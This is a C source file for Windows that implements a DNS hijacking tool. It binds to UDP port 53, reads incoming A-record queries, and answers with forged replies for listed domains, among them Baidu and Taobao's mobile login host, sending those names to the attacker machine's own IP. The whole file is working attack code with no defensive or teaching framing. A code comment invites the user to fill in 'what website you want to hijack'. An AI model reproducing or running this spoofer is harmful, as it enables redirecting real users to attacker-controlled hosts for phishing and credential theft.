
#include <malloc.h>
#include <memory.h>
#include <stdio.h>
#include <string.h>

#include <pcap.h>
#include <winsock.h>

#pragma comment (lib,"ws2_32")

#define DNS_PORT 53
#define DNS_QUERY_TYPE 0x1
#define DNS_SEND_BUFFER 1024
#define DNS_RECV_BUFFER 1024
#define DNS_SERVER "202.96.128.166"

#define IP_LENTGH 16

const char* dns_inject_host[]={  //  What website you want to hijack
    {"www.baidu.com"},
    {"www.cao.com"},
    {"login.m.taobao.com"},
    {"www.wodiao.com"}
};

const unsigned long dns_inject_total=sizeof(dns_inject_host)/4;

char local_ip[IP_LENTGH]={0};

#pragma pack(1)

typedef struct {
    u_int16_t id;
    u_int16_t flags;
    u_int16_t quests;
    u_int16_t answers;
    u_int16_t author;
    u_int16_t addition;
} dns,*point_dns;

typedef struct {
    u_int8_t *name;
    u_int16_t type;
    u_int16_t classes;
} query,*point_query;

typedef struct {
    u_int16_t name;
    u_int16_t type;
    u_int16_t classes;
    u_int32_t ttl;
    u_int16_t length;
    u_int32_t addr;
} response,*point_response;

#pragma pack()

void init_winsock(void) {
    WSADATA WSAData;
	WSAStartup(1,&WSAData);
}

void get_ip(void) {
    char local_host[64]={0};
    gethostname(local_host,64);
    hostent* host=gethostbyname(local_host);
    char* ip=inet_ntoa(*(in_addr*)host->h_addr_list[0]);
    memcpy(local_ip,ip,strlen(ip));
    printf("%s\n",local_ip);
}

char* conver_host(char* input_host) {
    if (NULL==input_host) return NULL;

    char* output_string=NULL;
    char* host=input_host;
    unsigned short alloc_length=0;
    while ('\0'!=*host) {
        alloc_length+=*(unsigned char*)host+1;
        host=(char*)(input_host+alloc_length);
    }
    output_string=(char*)malloc(alloc_length);
    memset(output_string,0,alloc_length);
    unsigned short read_point=0;
    while ('\0'!=*input_host) {
        unsigned char read_length=*input_host++;
        memcpy((char*)(output_string+read_point),input_host,read_length);
        *(char*)(output_string+read_point+read_length)='.';
        read_point+=read_length+1;
        input_host+=read_length;
    }
    *(char*)(output_string+read_point-1)='\0';

    return output_string;
}

void main(void) {
    init_winsock();
    get_ip();
    SOCKET sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);

    sockaddr_in local;
    local.sin_addr.S_un.S_addr=0;
    local.sin_family=AF_INET;
    local.sin_port=htons(DNS_PORT);
    if (SOCKET_ERROR==bind(sock,(const sockaddr*)&local,sizeof(sockaddr_in))) {
        printf("bind err!\n");
        return;
    }

    while (true) {
        char recv_buffer[DNS_RECV_BUFFER]={0};
        sockaddr_in remote;
        int remote_length=sizeof(remote);
        int recv_length=recvfrom(sock,recv_buffer,DNS_RECV_BUFFER,0,(sockaddr*)&remote,&remote_length);
        if (SOCKET_ERROR!=recv_length) {
            point_dns dns_=(point_dns)recv_buffer;
            point_query query_=(point_query)&recv_buffer[sizeof(dns)];
            unsigned short query_type=ntohs(*(unsigned short*)((unsigned long)query_+strlen((const char*)query_)+1));
            if (DNS_QUERY_TYPE==query_type) {
                bool hijack_flag=false;
                char* query_host=conver_host((char*)query_);
                unsigned int query_total=ntohs(dns_->quests);
                for (unsigned int check_index=0;check_index<dns_inject_total;++check_index) {
                    if (!strcmp(query_host,dns_inject_host[check_index])) {
                        printf("this is %s ,dns server is hijacking!new ip %s\n",query_host,local_ip);
                        hijack_flag=true;
                    }
                }
                free(query_host);

                if (hijack_flag) {
                    char send_buffer[DNS_SEND_BUFFER]={0};
                    response response;
                    response.addr=inet_addr(local_ip);
                    response.length=htons(4);
                    response.classes=htons(1);
                    response.ttl=htonl(300);
                    response.type=htons(query_type);
                    response.name=htons(0xC00C);
                    dns_->flags=htons(0x8180);
                    dns_->answers=htons(1);
                    memcpy(send_buffer,recv_buffer,recv_length);
                    memcpy(&send_buffer[recv_length],&response,sizeof(response));
                    sendto(sock,send_buffer,recv_length+sizeof(response),0,(const sockaddr*)&remote,sizeof(remote));
                }
            }
        } else
            break;
    }
}
